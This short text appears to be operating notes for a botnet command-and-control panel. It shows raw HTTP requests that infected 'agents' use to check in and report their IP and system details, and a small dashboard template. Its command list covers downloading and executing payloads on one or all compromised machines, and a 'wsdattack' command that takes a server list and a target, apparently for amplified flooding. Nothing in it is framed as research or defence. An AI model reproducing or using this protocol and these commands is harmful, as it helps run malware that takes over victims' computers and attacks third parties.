**Dashboard**

POST / HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/mr-xian
X-Access: d41d8cd98f00b204e9800998ecf8427e
Connection: close
Content-Length: 9

**install agent**

POST / HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Access: d41d8cd98f00b204e9800998ecf8427e
Connection: close
Content-Length: 201
ip=192.168.0.1&sysinfo=Darwin asans-MacBook-Pro.local 18.7.0 Darwin Kernel Version 18.7.0: Tue Aug 20 16:57:14 PDT 2019; root:xnu-4903.271.2~2/RELEASE_X86_64 x86_64&arch=64&platform=Darwin&version=

**commands:** 

execute {agent} {path} - download and execute payload {for linux: path add extension : Linux-x86_x64, for windows: path add extension: Windows-x86_64
    if agent == *  - execute payload from path on all machines, if agent==hash, execute only for selected agent
        
wsdattack [path_to_server_list] [target]


"""
<td>{{ escape(item.platform) }}</td>
           <td>{{ escape(item.hostname) }}</td>
           <td>{{ escape(item.ip) }}</td>
           <td>{{ escape(item.arch) }}</td>
           <td>{{ escape(item.sinfo) }}</td>
           <td>{{ escape(item.ver) }}</td>
           